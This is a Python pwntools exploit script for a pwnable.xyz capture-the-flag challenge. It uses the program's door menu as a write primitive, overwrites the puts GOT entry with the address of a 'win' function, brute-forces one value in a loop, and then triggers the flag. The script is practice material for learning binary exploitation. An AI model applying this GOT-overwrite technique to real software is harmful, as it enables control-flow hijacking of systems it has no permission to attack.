from pwn import *

# Pwnable.xyz Message challenge
# 100 points

"""
Door To Other RealmS
Menu:
 1. Choose a door.
 2. Open the door.
 3. Enter the door.
 4. Close door.
> 1
"""

context(kernel="amd64", arch="amd64", log_level="info")


def choose_door(p, door, realm):
	p.sendlineafter(b"> ", b"1")
	data = p.recv(4)
	if data != b"Door":
		return False
	p.sendline(str(door).encode("utf-8"))
	p.sendlineafter(b"Realm:", str(realm).encode("utf-8"))
	return True


def open_door(p, realm):
	p.sendlineafter(b"> ", b"2")
	if p.recv(4) != b"Real":
		print("[-] Door is zero!!!")
		return False

	p.sendline(str(realm).encode("utf-8"))
	return True


def enter_door(p):
	p.sendlineafter(b"> ", b"3")

def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		# gdb.attach(p, gdbscript="b *0x00000000004009fc\nb *0x0000000000400a51\nb *0x0000000000400a76")
		sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30039)

	win_addr = e.symbols["win"]
	door_addr = e.symbols["door"]
	puts_got = e.got["puts"]

	open_door(p, puts_got+4)
	enter_door(p)


	open_door(p, door_addr+1)
	enter_door(p)

	i = 0
	for i in range(0xff):
		if not open_door(p, i):
			exit()

		if choose_door(p, win_addr, puts_got):
			print(f"[+] Found realm! {i}")
			break

	enter_door(p)

	p.sendlineafter(b"> ", b"20")
	print(p.sendlineafter(b"> ", b"4").split(b"Menu:")[0])
	# print(p.recvrepeat())
	# p.interactive()


main()